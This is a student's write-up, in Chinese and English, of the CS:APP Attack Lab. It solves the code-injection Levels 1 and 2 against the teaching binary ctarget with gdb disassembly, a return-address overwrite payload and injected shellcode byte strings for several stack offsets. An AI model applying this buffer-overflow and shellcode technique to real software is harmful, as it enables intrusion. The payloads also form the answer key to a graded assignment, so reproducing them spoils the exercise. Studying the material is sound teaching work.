





# Attack Lab

## Code Injection

### Level1

Task: to get ctarget to execute touch1 instead of test when getbuf executes its ret statement

test调用getbuf, 我们需要进行buffer overflow修改ret地址, 让返回地址变成touch1的起始地址即可

首先看getbuf的buffer size, 可以看出是40, 所以我们需要一个长度为40的字符串填满stack上的padding

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
0x00000000004017a8 <+0>:	sub    $0x28,%rsp
0x00000000004017ac <+4>:	mov    %rsp,%rdi
0x00000000004017af <+7>:	callq  0x401a40 <Gets>
0x00000000004017b4 <+12>:	mov    $0x1,%eax
0x00000000004017b9 <+17>:	add    $0x28,%rsp
0x00000000004017bd <+21>:	retq
```

可以看到stack上的返回地址是0x0000000000401976, 我们需要把这个地址修改为0x00000000004017c0

所以多写的2个字符是17和c0, 应该先写c0, 后写17

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
0x0000000000401968 <+0>:	sub    $0x8,%rsp
0x000000000040196c <+4>:	mov    $0x0,%eax
0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
0x0000000000401976 <+14>:	mov    %eax,%edx
0x0000000000401978 <+16>:	mov    $0x403188,%esi
0x000000000040197d <+21>:	mov    $0x1,%edi
0x0000000000401982 <+26>:	mov    $0x0,%eax
0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
0x000000000040198c <+36>:	add    $0x8,%rsp
0x0000000000401990 <+40>:	retq
```

```assembly
(gdb) disassemble touch1
Dump of assembler code for function touch1:
0x00000000004017c0 <+0>:	sub    $0x8,%rsp
0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
0x00000000004017d8 <+24>:	mov    $0x1,%edi
0x00000000004017dd <+29>:	callq  0x401c8d <validate>
0x00000000004017e2 <+34>:	mov    $0x0,%edi
0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

**Level1 solution**

只要最后4个写入的字节是c0 17 40 00 即可, 前面的40字节随意

```assembly
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
c0 17 40 00
```


### Level2

Task: to get ctarget to execute touch2 instead of test when getbuf executes its ret statement

touch2不同于touch1的点是: touch2需要一个参数, 也就是意味着需要多一步类似于 movq 0xabcd, %rdi 的操作

所以需要把这条指令的hex value放到栈上执行

```assembly
00000000004017ec <touch2>:
4017ec:       48 83 ec 08             sub    $0x8,%rsp
4017f0:       89 fa                   mov    %edi,%edx
4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:       00 00 00
4017fc:       3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:       75 20                   jne    401824 <touch2+0x38>
```

根据stack的convention可以知道, 如果我们把需要执行的指令直接写到buffer里在正常情况下是不管用的, 因为最后在弹栈的时候会直接越过整个buffer, 直接执行ret. 那么问题来了, 我们要inject的指令放在哪里?

我们必须通过覆盖return address位置的值, 让getbuf返回时, 跳到一个我们自己定义的函数(指令)位置, 进而才能执行 %rdi的赋值操作

也就是说, 我们要inject一个函数或一段指令, 完成的功能是:

1，把0x59b997fa放到%rdi

```assembly
movq  $0x59b997fa,%rdi
```

2，然后返回到touch2函数

- 这个实现方法是: push touch2函数的起始地址到stack上, 然后执行ret

```assembly
pushq $0x4017ec
ret
```


编写一个move.s文件

```assembly
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

执行

```bash
> gcc -c move.s
```

得到move.o, 然后objdump出指令的hex value

```bash
> objdump -d move.o
move.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:	68 ec 17 40 00       	pushq  $0x4017ec
c:	c3                   	retq
```

我们需要一个改写原本ret的地址为movq  $0x59b997fa,%rdi的地址

那么我们需要把这个mov即后续指令放在stack上的某个位置即可

假设放在$rsp + 8的位置, gdb进入getbuf可以查看%rsp+8的值0x5561dc80, 我们就把injected code的起始指令mov放在这里

得到solution

```assembly
00 00 00 00 00 00 00 00  # %rsp
48 c7 c7 fa 97 b9 59 68  # %rsp+8 开始写入injected code
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 dc 61 55 00 00 00 00  # buffer overflow的位置写入ret要跳转目标地址, 即%rsp+8的地址
```

同理, 我们也可以把injected code起始放到%rsp位置, 对应solution

```assembly
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # ret 跳转%rsp+8
```

injected code起始在%rsp+16位置, 对应solution

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
88 dc 61 55 00 00 00 00  # ret 跳转%rsp+16
```

injected code起始在%rsp+24位置, 对应solution

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
90 dc 61 55 00 00 00 00  # ret 跳转%rsp+24
```

%rsp+24是可以利用的极限地址了, 因为buffer空间不够了



测试endian

```assembly
00000000004017a8 <getbuf>:
4017a8:       48 83 ec 28             sub    $0x28,%rsp
4017ac:       48 89 e7                mov    %rsp,%rdi
4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
```

x/x 0x4017a8 => 0x28ec8348

x/x 0x4017a9 => 0x4828ec83

x/x 0x4017aa => 0x894828ec
